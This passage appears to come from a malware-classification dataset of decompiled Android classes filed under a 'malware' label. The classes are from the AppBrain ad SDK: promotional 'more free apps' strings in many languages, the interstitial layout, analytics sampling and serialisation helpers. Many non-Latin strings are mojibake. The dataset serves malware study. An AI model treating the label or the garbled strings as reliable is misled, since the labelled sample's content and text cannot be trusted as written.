Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„Ø±Ø§Ø¦Ø¹Ø© Ù„Ù‡Ø§ØªÙ�Ùƒ"",""Ù‡Ù„ ØªØ±ØºØ¨ Ù�ÙŠ Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ©ØŸ"",""Ù‡Ù†Ø§Ùƒ Ø§Ù„Ø¹Ø¯ÙŠØ¯ Ù…Ù† Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ© Ø¨Ø§Ù†ØªØ¸Ø§Ø±Ùƒ!\u200f"",""Ù†Ø²Ù‘Ù�Ù„ Ø§Ù„Ø¢Ù†"",""Ù†Ø²Ù‘Ù�Ù„ Ø¹Ø±ÙˆØ¶ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ© Ø§Ù„ÙŠÙˆÙ…"",""Ù†Ø²Ù‘Ù�Ù„ Ø£Ù�Ø¶Ù„ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ©"",""Ù„ÙŠØ³ Ø§Ù„Ø¢Ù†"",null,""Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ù„ØªÙ†Ø²ÙŠÙ„Ù‡ Ù…Ù† Ù…ØªØ¬Ø± Ø¬ÙˆØ¬Ù„ Ø¨Ù„Ø§ÙŠ"",""Ù†Ø´ÙƒØ±Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ ØªØ·Ø¨ÙŠÙ‚Ù†Ø§!\u200f""});     b.put(""he"",new String[]{""×›×Ÿ!\u200f"",""×‘×—×™× ×�"",""×¢×•×“ ×�×¤×œ×™×§×¦×™×•×ª ×—×™× ×ž×™×•×ª"",""×”×•×¨×“"",""×§×‘×œ ×¢×•×“ ×�×¤×œ×™×§×¦×™×•×ª × ×”×“×¨×•×ª ×¢×‘×•×¨ ×”×˜×œ×¤×•×Ÿ ×©×œ×š"",""×”×�×� ×�×ª×” ×¨×•×¦×” ×¢×•×“ ×�×¤×œ×™×§×¦×™×•×ª ×—×™× ×ž×™×•×ª?\u200f"",""×™×© ×œ× ×• ×�×¤×œ×™×§×¦×™×•×ª ×—×™× ×ž×™×•×ª × ×”×“×¨×•×ª ×‘×©×‘×™×œ×š!\u200f"",""×”×•×¨×“ ×¢×›×©×™×•"",""×”×•×¨×“ ×�×ª ×”×�×¤×œ×™×§×¦×™×•×ª ×”×—×™× ×ž×™×•×ª ×©×œ ×”×™×•×�"",""×”×•×¨×“ ×�×ª ×”×�×¤×œ×™×§×¦×™×•×ª ×”×—×™× ×ž×™×•×ª ×”×˜×•×‘×•×ª ×‘×™×•×ª×¨"",""×œ×� ×¢×›×©×™×•"",null,""\u202b×œ×—×¥ ×¢×œ ×�×¤×œ×™×§×¦×™×” ×›×“×™ ×œ×”×•×¨×™×“ ×�×•×ª×” ×ž×—× ×•×ª Google Play"",""×ª×•×“×” ×¢×œ ×”×©×™×ž×•×© ×‘×�×¤×œ×™×§×¦×™×” ×©×œ× ×•!\u200f""});     b.put(""cs"",new String[]{""Ano!"",""Zdarma"",""VÃ­ce bezplatnÃ½ch aplikacÃ­"",""StÃ¡hni"",""ZÃ­skej vÃ­ce skvÄ›lÃ½ch aplikacÃ­ pro tvÅ¯j mobil"",""ChtÄ›li byste vÃ­ce bezplatnÃ½ch aplikacÃ­?"",""SkvÄ›lÃ© bezplatnÃ© aplikace, kterÃ© Ä�ekajÃ­ jen na tebe!"",""StÃ¡hnout nynÃ­"",""StÃ¡hni si bezplatnÃ© aplikace z dneÅ¡nÃ­ nabÃ­dky"",""StÃ¡hni si nejlepÅ¡Ã­ bezplatnÃ© aplikace"",""TeÄ� ne"",null,""Klikni na aplikaci a stÃ¡hni si ji z obchodu Google Play"",""DÄ›kujeme, Å¾e pouÅ¾Ã­vÃ¡te naÅ¡i aplikace!""});     b.put(""th"",new String[]{""à¹ƒà¸Šà¹ˆ!"",""à¸Ÿà¸£à¸µ"",""à¹�à¸­à¸›à¸Ÿà¸£à¸µà¹€à¸žà¸´à¹ˆà¸¡à¹€à¸•à¸´à¸¡"",""à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”"",""à¸£à¸±à¸šà¹�à¸­à¸›à¸”à¸µà¹† à¹€à¸žà¸´à¹ˆà¸¡à¹ƒà¸«à¹‰à¹‚à¸—à¸£à¸¨à¸±à¸žà¸—à¹Œà¸„à¸¸à¸“"",""à¸•à¹‰à¸­à¸‡à¸�à¸²à¸£à¹�à¸­à¸›à¸Ÿà¸£à¸µà¹€à¸žà¸´à¹ˆà¸¡à¹„à¸«à¸¡?"",""à¸¡à¸µà¹�à¸­à¸›à¸Ÿà¸£à¸µà¸”à¸µà¹† à¸£à¸­à¸„à¸¸à¸“à¸­à¸¢à¸¹à¹ˆ!"",""à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”à¹€à¸¥à¸¢"",""à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”à¸‚à¹‰à¸­à¹€à¸ªà¸™à¸­à¹�à¸­à¸›à¸Ÿà¸£à¸µà¸§à¸±à¸™à¸™à¸µà¹‰"",""à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”à¸ªà¸¸à¸”à¸¢à¸­à¸”à¹�à¸­à¸›à¸Ÿà¸£à¸µ"",""à¸•à¸­à¸™à¸™à¸µà¹‰à¸¢à¸±à¸‡"",null,""à¸„à¸¥à¸´à¸�à¹�à¸­à¸›à¹€à¸žà¸·à¹ˆà¸­à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”à¸ˆà¸²à¸�à¸•à¸¥à¸²à¸”à¸�à¸¹à¹€à¸�à¸´à¹‰à¸¥à¹€à¸žà¸¥à¸¢à¹Œ"",""à¸‚à¸­à¸šà¸„à¸¸à¸“à¸—à¸µà¹ˆà¹ƒà¸Šà¹‰à¹�à¸­à¸›à¹€à¸£à¸²!""});     b.put(""de"",new String[]{""Ja!"",""Kostenlos"",""Mehr kostenlose Apps"",""Herunterladen"",""Hol dir ein paar tolle Apps fÃ¼r dein Handy"",""Willst Du mehr kostenlose Apps?"",""Hier warten ein paar coole kostenlose Apps auf Dich!"",""Jetzt herunterladen"",""Downloade die kostenlosen App Angebote des Tages"",""Lad dir die besten kostenlosen Apps runter"",""Nein"",null,""Eine App anklicken um sie von Google Play herunterzuladen"",""Danke fÃ¼rs Verwenden unserer App!""});     b.put(AnalyticsEvent.EVENT_ID,new String[]{""Ya!"",""Gratis"",""Aplikasi gratis lainnya"",""Unduh"",""Dapatkan aplikasi hebat lainnya untuk ponsel Anda"",""Anda ingin aplikasi gratis lainnya?"",""Ada aplikasi gratis hebat yang menanti Anda!"",""Unduh sekarang"",""Unduh penawaran aplikasi gratis hari ini"",""Unduh aplikasi terbaik"",""Tidak sekarang"",null,""Klik aplikasi untuk mengunduhnya dari pasar Google Play"",""Terima kasih untuk menggunakan aplikasi kami!""});     b.put(""pl"",new String[]{""Tak!"",""Darmowe"",""WiÄ™cej darmowych aplikacji"",""Pobierz"",""SprawdÅº wiÄ™cej Å›wietnych aplikacji na swÃ³j telefon"",""Chcesz wiÄ™cej darmowych aplikacji?"",""Åšwietne darmowe aplikacje czekajÄ… na Ciebie!"",""Pobierz teraz"",""SprawdÅº dzisiejsze propozycje darmowych aplikacji"",""Pobierz najlepsze darmowe aplikacje"",""Nie teraz"",null,""Kliknij na aplikacjÄ™ aby pobraÄ‡ jÄ… z marketu Google Play"",""DziÄ™kujemy za uÅ¼ywanie naszej aplikacji!""});     b.put(""pt"",new String[]{""Sim!"",""GrÃ¡tis"",""Mais apps grÃ¡tis"",""Baixar"",""Obtenha mais apps excelentes para seu aparelho"",""Gostaria de mais apps grÃ¡tis?"",""HÃ¡ excelentes apps grÃ¡tis esperando por vocÃª!"",""Baixar agora"",""Baixe ofertas de apps grÃ¡tis de hoje"",""Baixe os melhores apps grÃ¡tis"",""Agora nÃ£o"",null,""Clique em um app para baixar do Google Play"",""Obrigado por usar nosso app!""});     b.put(""sv"",new String[]{""Ja!"",""Gratis"",""Fler gratisappar"",""Ladda ner"",""Skaffa fler bra appar till din telefon"",""Vill du ha fler gratisappar?"",""NÃ¥gra jÃ¤ttebra gratisappar vÃ¤ntar pÃ¥ dig!"",""Ladda ner nu"",""Ladda ner dagens gratis apperbjudanden"",""Ladda ner de bÃ¤sta gratisapparna"",""Inte nu"",null,""Klicka pÃ¥ en app fÃ¶r att ladda ner den frÃ¥n Google Play-butiken"",""Tack fÃ¶r att du anvÃ¤nder vÃ¥r app!""});     b.put(""fr"",new String[]{""Oui!"",""Gratuit"",""Plus d'applis"",""Installer"",""Trouvez plus d'applis gÃ©niales pour votre tÃ©lÃ©phone"",""Voulez-vous plus d'applis gratuites?"",""Des applis gÃ©niales vous attendent!"",""Installer maintenant"",""TÃ©lÃ©chargez les meilleures applis d'aujourd'hui"",""Installez les meilleures applis gratuites"",""Pas maintenant"",null,""Cliquez sur une appli pour l'installer de la boutique Google Play"",""Merci d'avoir utilisÃ© notre application!""});     b.put(""ru"",new String[]{""Ð”Ð°!"",""Ð‘ÐµÑ�Ð¿Ð»Ð°Ñ‚Ð½Ð¾"",""Ð‘Ð¾Ð»ÑŒÑˆÐµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¹"",""Ð¡ÐºÐ°Ñ‡Ð°Ñ‚ÑŒ"",""ÐŸÐ¾Ð»ÑƒÑ‡Ð¸ Ð±Ð¾Ð»ÑŒÑˆÐµ ÐºÐ»Ð°Ñ�Ñ�Ð½Ñ‹Ñ… Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¹ Ð´Ð»Ñ� Ñ�Ð²Ð¾ÐµÐ³Ð¾ Ñ‚ÐµÐ»ÐµÑ„Ð¾Ð½Ð°!"",""Ð¢Ñ‹ Ð±Ñ‹ Ñ…Ð¾Ñ‚ÐµÐ» Ð¿Ð¾Ð»ÑƒÑ‡Ð°Ñ‚ÑŒ Ð´Ñ€ÑƒÐ³Ð¸Ðµ Ð±ÐµÑ�Ð¿Ð»Ð°Ñ‚Ð½Ñ‹Ðµ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ñ‹?"",""Ð¢ÐµÐ±Ñ� Ð¶Ð´ÑƒÑ‚ ÐºÐ»Ð°Ñ�Ñ�Ð½Ñ‹Ðµ Ð±ÐµÑ�Ð¿Ð»Ð°Ñ‚Ð½Ñ‹Ðµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ�!"",""Ð¡ÐºÐ°Ñ‡Ð°Ñ‚ÑŒ Ñ�ÐµÐ¹Ñ‡Ð°Ñ�"",""CÐºÐ°Ñ‡Ð°Ð¹ Ñ�ÐµÐ³Ð¾Ð´Ð½Ñ� Ð±ÐµÑ�Ð¿Ð»Ð°Ñ‚Ð½Ñ‹Ðµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ�"",""Ð¡ÐºÐ°Ñ‡Ð°Ð¹ Ð»ÑƒÑ‡ÑˆÐ¸Ðµ Ð±ÐµÑ�Ð¿Ð»Ð°Ð½Ñ‚Ñ‹Ðµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ�"",""Ð�Ðµ Ñ�ÐµÐ¹Ñ‡Ð°Ñ�"",null,""Ð’Ñ‹Ð±ÐµÑ€Ð¸ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ñ�ÐºÐ°Ñ‡Ð°Ñ‚ÑŒ ÐµÐ³Ð¾ Ñ� Google Play"",""Ð¡Ð¿Ð°Ñ�Ð¸Ð±Ð¾, Ñ‡Ñ‚Ð¾ Ñ‚Ñ‹ Ð¸Ñ�Ð¿Ð¾Ð»ÑŒÐ·ÑƒÐµÑˆÑŒ Ð½Ð°ÑˆÑƒ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ñƒ.""});     b.put(AnalyticsEvent.TYPE_END_SESSION,new String[]{""Â¡SÃ­!"",""Gratis"",""MÃ¡s aplicaciones gratis"",""Descargar"",""ObtÃ©n mÃ¡s aplicaciones fabulosas para tu telÃ©fono"",""Â¿Te gustarÃ­a descargar mÃ¡s aplicaciones gratis?"",""Hay fabulosas aplicaciones gratis esperÃ¡ndote."",""Descargar ahora"",""Descarga las ofertas de aplicaciones gratis para hoy"",""Descarga las mejores aplicaciones gratis"",""Ahora no"",null,""Pulsa en una aplicaciÃ³n para descargarla del mercado Google Play"",""Â¡Gracias por usar nuestra aplicaciÃ³n!""});     b.put(""ja"",new String[]{""ã�¯ã�„ï¼�"",""ç„¡æ–™"",""ä»–ã�®ç„¡æ–™ã‚¢ãƒ—ãƒª"",""ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰"",""ç´ æ™´ã�—ã�„ã‚¢ãƒ—ãƒªã‚’ã‚‚ã�£ã�¨ã�‚ã�ªã�Ÿã�®é›»è©±ã�«ã‚²ãƒƒãƒˆã�—ã‚ˆã�†"",""ä»–ã�®ç„¡æ–™ã‚¢ãƒ—ãƒªã‚’è©¦ã�•ã‚Œã�¾ã�™ã�‹ï¼Ÿ"",""ç„¡æ–™ã�®ã‚¢ãƒ—ãƒªã�Œã�‚ã�ªã�Ÿã‚’ã�Šå¾…ã�¡ã�—ã�¦ã�Šã‚Šã�¾ã�™ï¼�"",""ä»Šã�™ã��ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰"",""ä»Šæ—¥ã�®ç„¡æ–™ã‚¢ãƒ—ãƒªã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰"",""æœ€é«˜ã�®ç„¡æ–™ã‚¢ãƒ—ãƒªã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰"",""å¾Œã�§"",null,""Google Playãƒžãƒ¼ã‚±ãƒƒãƒˆã�‹ã‚‰ã‚¯ãƒªãƒƒã‚¯ã�—ã�¦ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰"",""å½“ç¤¾ã�®ã‚¢ãƒ—ãƒªã‚’ã�”ä½¿ç”¨é ‚ã��ã�‚ã‚Šã�Œã�¨ã�†ã�”ã�–ã�„ã�¾ã�™ï¼�""});     b.put(""nl"",new String[]{""Ja!"",""Gratis"",""Meer gratis apps"",null,""Zet meer goede apps op je telefoon"",""Wil je meer gratis apps?"",""Er staan een aantal goede gratis apps voor je klaar!"",""Download nu"",""Download de gratis apps van vandaag"",""Download de beste gratis apps"",""Niet nu"",""App-promotie door AppBrain"",""Klik een app om hem te downloaden in de Google Play markt"",""Dank je voor het gebruiken van onze app!""});   }   public static String a(  int i,  String str){     if (""iw"".equals(str)) {       str=""he"";     }     if (""in"".equals(str)) {       str=AnalyticsEvent.EVENT_ID;     }     String[] strArr=(String[])b.get(str);     if (strArr == null) {       strArr=a;     }     String str2=strArr[i];     return str2 == null ? a[i] : str2;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\w.code","public final class w {   private static final w a=new w();   private static final w b=new w();   private long c=Long.MIN_VALUE; public static class a {     private final StringBuilder a=new StringBuilder();     private a a(    String str,    String str2){       this.a.append(""&"");       this.a.append(str);       this.a.append(""="");       this.a.append(str2);       return this;     }     public final a a(    int i){       return a(""it"",String.valueOf(i));     }     public final a a(    long j){       return a(""bi"",String.valueOf(j));     }     public final a a(    String str){       return a(""ic"",str);     }     public final a a(    boolean z){       return a(""sm"",z ? ""1"" : ""0"");     }     public final a b(    int i){       return a(""bt"",String.valueOf(i));     }     public final a b(    boolean z){       return a(""mb"",z ? ""1"" : ""0"");     }     public final String toString(){       return this.a.toString();     }   }   public static void a(  Context context,  String str){     a.a(context,str,""bcsample"");   }   private synchronized void a(  Context context,  String str,  String str2){     long elapsedRealtime=SystemClock.elapsedRealtime();     if (this.c < elapsedRealtime - 30000) {       this.c=elapsedRealtime;       int a2=be.a().a(str2,3);       if (Math.random() < 1.0d / (1 << a2)) {         Intent intent=new Intent(context,(Class<?>)AppBrainService.class);         intent.putExtra(""ip"",str);         intent.putExtra(""cp2"",a2);         context.startService(intent);       }     }   }   public static void b(  Context context,  String str){     b.a(context,str,""icsample"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\x.code","public final class x implements AppBrainActivity.a {   private static cmn.aa a;   private static cmn.aa b;   private final Activity c;   private String d;   private boolean e;   private LinearLayout f;   private LayerDrawable g;   private boolean h;   private a.C0006a i;   private boolean j;   public x(  Activity activity){     this.c=activity;   }   private View a(  int i,  View view,  int[] iArr,  boolean z){     FrameLayout frameLayout=new FrameLayout(this.c);     view.setLayoutParams(new FrameLayout.LayoutParams(i,i));     cmn.a a2=cmn.a.a();     ShapeDrawable shapeDrawable=new ShapeDrawable(new OvalShape());     shapeDrawable.setShaderFactory(new ae(this,iArr));     a2.a(view,com.appbrain.d.c.a(this.c,shapeDrawable));     if (z) {       int sqrt=(i - ((int)Math.sqrt(Math.pow(i,2.0d) / 2.0d))) / 2;       view.setPadding(sqrt,sqrt,sqrt,sqrt);     }     if ((iArr[0] & (-16777216)) == -16777216 && (iArr[1] & (-16777216)) == -16777216) {       int b2=cmn.ab.b(5.0f);       int i2=i + b2;       View view2=new View(this.c);       ViewGroup.MarginLayoutParams marginLayoutParams=new ViewGroup.MarginLayoutParams(i2,i2);       marginLayoutParams.setMargins((-b2) / 2,b2,0,0);       view2.setLayoutParams(marginLayoutParams);       ShapeDrawable shapeDrawable2=new ShapeDrawable(new OvalShape());       shapeDrawable2.setShaderFactory(new ag(this,b2));       cmn.a.a().a(view2,shapeDrawable2);       frameLayout.addView(view2);     }     frameLayout.addView(view);     return frameLayout;   }   public static void a(  x xVar,  int i,  int i2){     xVar.g.getDrawable(1).setAlpha(255);     Rect rect=new Rect();     Point point=new Point();     if (xVar.f.getGlobalVisibleRect(rect,point)) {       int i3=i - point.x;       int i4=i2 - point.y;       int b2=cmn.ab.b(300.0f) / 2;       int i5=i4 - b2;       int height=rect.height() - (i4 + b2);       xVar.g.setLayerInset(1,i3 - b2,i5,rect.width() - (i3 + b2),height);     }   }   public static boolean a(  x xVar){     xVar.h=true;     return true;   }   private static int b(  int i){     return (((int)Math.sqrt(Math.pow(i,2.0d) / 2.0d)) / 2) + (i / 2);   }   private void e(){     Configuration configuration=this.c.getResources().getConfiguration();     boolean z=configuration.orientation == 2;     String language=configuration.locale.getLanguage();     ah ahVar=new ah(new ah.b((byte)0).a(this.e ? ah.a().a(-1117707,-3618614).a(-13224394).a() : ah.a().a(-12303292,-15592942).a(-1).a()).b(ah.a().a(-8343745,-8343745).a(-1117707).b(0).a()).c(ah.a().a(-4991873,-7819699).a(-1).b(-10716373).a()).d(ah.a().a(-8289919,-12895429).a(-1).b(-14540254).a()),(byte)0);     int b2=cmn.ab.b(20.0f);     int b3=cmn.ab.b(24.0f);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     layoutParams.setMargins(b2,b3,b2,b3);     TextView textView=new TextView(this.c);     textView.setLayoutParams(layoutParams);     textView.setTextColor(ahVar.b.c);     textView.setTextSize(20.0f);     textView.setTypeface(textView.getTypeface(),1);     textView.setGravity(1);     textView.setText(ax.a().c() ? v.a(13,language) : ""AppLift SDK requires changes to your proguard config as detailed in the documentation!"");     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(z ? 0 : -2,-2);     layoutParams2.weight=z ? 1.0f : 0.0f;     layoutParams2.bottomMargin=b3;     layoutParams2.gravity=1;     TextView textView2=new TextView(this.c);     textView2.setLayoutParams(layoutParams2);     textView2.setTextColor(ahVar.c.c);     textView2.setTextSize(18.0f);     cmn.a a2=cmn.a.a();     int b4=cmn.ab.b(3.0f);     ah.a aVar=ahVar.c;     int b5=cmn.ab.b(1.0f);     float[] fArr=new float[8];     float[] fArr2=new float[8];     float[] fArr3=new float[8];     Arrays.fill(fArr,cmn.ab.a(8.0f));     Arrays.fill(fArr2,fArr[0] - b4);     Arrays.fill(fArr3,fArr[0] - b5);     ShapeDrawable shapeDrawable=new ShapeDrawable(new RoundRectShape(fArr2,null,null));     shapeDrawable.setShaderFactory(new ab(this,aVar));     ShapeDrawable[] shapeDrawableArr={r8,r4,shapeDrawable};     ShapeDrawable shapeDrawable2=new ShapeDrawable(new RoundRectShape(fArr,null,null));     shapeDrawable2.getPaint().setColor(aVar.b);     ShapeDrawable shapeDrawable3=new ShapeDrawable(new RoundRectShape(fArr,new RectF(b5,b5,b5,b5),fArr3));     shapeDrawable3.setShaderFactory(new ad(this,b4));     LayerDrawable layerDrawable=new LayerDrawable(shapeDrawableArr);     layerDrawable.setLayerInset(2,b4,b4,b4,b4);     shapeDrawable.setPadding(cmn.ab.b(15.0f),cmn.ab.b(15.0f),cmn.ab.b(15.0f),cmn.ab.b(15.0f));     a2.a(textView2,layerDrawable);     textView2.setGravity(17);     textView2.setText(v.a(5,language));     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(10);     layoutParams3.addRule(9);     Button button=new Button(this.c);     button.setText(v.a(0,language));     button.setTextColor(ahVar.d.c);     button.setTextSize(20.0f);     button.setTypeface(button.getTypeface(),1);     button.setGravity(17);     button.setOnClickListener(new y(this));     button.getViewTreeObserver().addOnGlobalLayoutListener(new z(this,button));     View a3=a(cmn.ab.b(120.0f),button,ahVar.d.a,true);     a3.setLayoutParams(layoutParams3);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);     layoutParams4.addRule(12);     layoutParams4.addRule(11);     Button button2=new Button(this.c);     button2.setTextColor(ahVar.e.c);     button2.setTypeface(button2.getTypeface(),1);     button2.setOnClickListener(new aa(this));     String a4=v.a(10,language);     button2.setTextSize(cmn.x.a(a4,80,80,Math.min(a4.split(""\t"").length,3),16.0f,button2.getPaint(),button2.getTypeface()));     button2.setText(a4);     View a5=a(cmn.ab.b(80.0f),button2,ahVar.e.a,false);     a5.setLayoutParams(layoutParams4);     int b6=b(button.getLayoutParams().width) + b(button2.getLayoutParams().width);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(cmn.ab.b(18.0f) + b6,b6 - cmn.ab.b(20.0f));     layoutParams5.leftMargin=z ? cmn.ab.b(20.0f) : 0;     RelativeLayout relativeLayout=new RelativeLayout(this.c);     relativeLayout.setLayoutParams(layoutParams5);     relativeLayout.setGravity(17);     relativeLayout.addView(a5);     relativeLayout.addView(a3);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);     layoutParams6.setMargins(b2,0,b2,0);     LinearLayout linearLayout=new LinearLayout(this.c);     linearLayout.setLayoutParams(layoutParams6);     linearLayout.setGravity(1);     linearLayout.addView(textView2);     linearLayout.addView(relativeLayout);     linearLayout.setOrientation(z ? 0 : 1);     ShapeDrawable shapeDrawable4=new ShapeDrawable(new OvalShape());     shapeDrawable4.setShaderFactory(new af(this));     Drawable[] drawableArr={new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,ahVar.b.a),shapeDrawable4};     drawableArr[1].setAlpha(0);     this.g=new LayerDrawable(drawableArr);     this.f=new LinearLayout(this.c);     this.f.setOrientation(1);     cmn.a.a().a(this.f,this.g);     this.f.addView(textView);     this.f.addView(linearLayout);     this.c.setContentView(this.f);   }   @Override public final void a(){     e();   }   @Override public final void a(  Bundle bundle){     boolean z;     this.c.getWindow().setFormat(1);     this.c.requestWindowFeature(1);     com.appbrain.c.a(this.c);     Intent intent=this.c.getIntent();     if (intent != null) {       this.j=intent.getBooleanExtra(""maybe"",false);       this.d=intent.getStringExtra(""ana"");       com.appbrain.a aVar=(com.appbrain.a)intent.getSerializableExtra(""adop"");       this.e=aVar.b() == a.EnumC0005a.LIGHT;       z=aVar.c();     }  else {       z=false;     }     this.i=a.C0006a.a(intent);     e();     if (bundle == null) {       w.b(this.c,new w.a().a(""more_apps"").a(z).b(this.j).a(this.e ? 1 : 0).toString());     }     if (b != null) {       b.a(this.c);     }   }   @Override public final boolean a(  int i){     return false;   }   @Override public final void b(){     if (a != null) {       a.a(Boolean.valueOf(this.h));     }   }   @Override public final void b(  Bundle bundle){   }   @Override public final boolean c(){     return true;   }   @Override public final void d(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\y.code","public final class y implements View.OnClickListener {   final x a;   public y(  x xVar){     this.a=xVar;   }   @Override public final void onClick(  View view){     String str;     Activity activity;     boolean z;     a.C0006a c0006a;     Activity activity2;     x.a(this.a);     str=this.a.d;     ai.a(str);     activity=this.a.c;     z=this.a.j;     j.h hVar=z ? j.h.MAYBE_INTERSTITIAL : j.h.INTERSTITIAL;     c0006a=this.a.i;     a.a(activity,hVar,c0006a);     activity2=this.a.c;     activity2.finish();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\z.code","public final class z implements ViewTreeObserver.OnGlobalLayoutListener {   final Button a;   final x b;   public z(  x xVar,  Button button){     this.b=xVar;     this.a=button;   }   @Override public final void onGlobalLayout(){     Rect rect=new Rect();     if (this.a.getGlobalVisibleRect(rect,new Point())) {       x.a(this.b,rect.centerX(),rect.centerY());     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\a.code","public abstract class a implements m { public static abstract class AbstractC0008a implements m.a {     private static void a(    Iterable iterable){       Iterator it=iterable.iterator();       while (it.hasNext()) {         if (it.next() == null) {           throw new NullPointerException();         }       }     }     public static void a(    Iterable iterable,    Collection collection){       if (iterable instanceof k) {         a(((k)iterable).a());       }  else {         a(iterable);       }       if (iterable instanceof Collection) {         collection.addAll((Collection)iterable);         return;       }       Iterator it=iterable.iterator();       while (it.hasNext()) {         collection.add(it.next());       }     }     @Override public abstract AbstractC0008a clone();   }   @Override public final c a(){     try {       c.b a=c.a(c());       a(a.b());       return a.a();     }  catch (    IOException e) {       throw new RuntimeException(""Serializing to a ByteString threw an IOException (should never happen)."",e);     }   }   @Override public final byte[] b(){     try {       byte[] bArr=new byte[c()];       e a=e.a(bArr);       a(a);       a.b();       return bArr;     }  catch (    IOException e) {       throw new RuntimeException(""Serializing to a byte array threw an IOException (should never happen)."",e);     }   } } public interface a extends Iterator {   byte a(); } public static class a extends IOException {   a(){     super(""CodedOutputStream was writing to a flat byte array and ran out of space."");   } } public static abstract class a extends a.AbstractC0008a {   @Override public a clone(){     throw new UnsupportedOperationException(""This is supposed to be overridden by subclasses."");   } } public interface a { } public class a implements c.a {   private int b;   private final int c;   private a(){     this.b=0;     this.c=l.this.b();   }   a(  l lVar,  byte b){     this();   }   @Override public final byte a(){     try {       byte[] bArr=l.this.c;       int i=this.b;       this.b=i + 1;       return bArr[i];     }  catch (    ArrayIndexOutOfBoundsException e) {       throw new NoSuchElementException(e.getMessage());     }   }   @Override public final boolean hasNext(){     return this.b < this.c;   }   @Override public final Object next(){     return Byte.valueOf(a());   }   @Override public final void remove(){     throw new UnsupportedOperationException();   } } public interface a extends n, Cloneable {   m c(); } public static class a implements Iterator {   private final Stack a;   private l b;   private a(  com.appbrain.b.c cVar){     this.a=new Stack();     this.b=a(cVar);   }   a(  com.appbrain.b.c cVar,  byte b){     this(cVar);   }   private l a(  com.appbrain.b.c cVar){     com.appbrain.b.c cVar2=cVar;     while (cVar2 instanceof p) {       p pVar=(p)cVar2;       this.a.push(pVar);       cVar2=pVar.e;     }     return (l)cVar2;   }   private l b(){     while (!this.a.isEmpty()) {       l a=a(((p)this.a.pop()).f);       if (!a.c()) {         return a;       }     }     return null;   }   @Override public final l next(){     if (this.b == null) {       throw new NoSuchElementException();     }     l lVar=this.b;     this.b=b();     return lVar;   }   @Override public final boolean hasNext(){     return this.b != null;   }   @Override public final void remove(){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\AbstractC0008a.code","public static abstract class AbstractC0008a implements m.a {   private static void a(  Iterable iterable){     Iterator it=iterable.iterator();     while (it.hasNext()) {       if (it.next() == null) {         throw new NullPointerException();       }     }   }   public static void a(  Iterable iterable,  Collection collection){     if (iterable instanceof k) {       a(((k)iterable).a());     }  else {       a(iterable);     }     if (iterable instanceof Collection) {       collection.addAll((Collection)iterable);       return;     }     Iterator it=iterable.iterator();     while (it.hasNext()) {       collection.add(it.next());     }   }   @Override public abstract AbstractC0008a clone(); } "
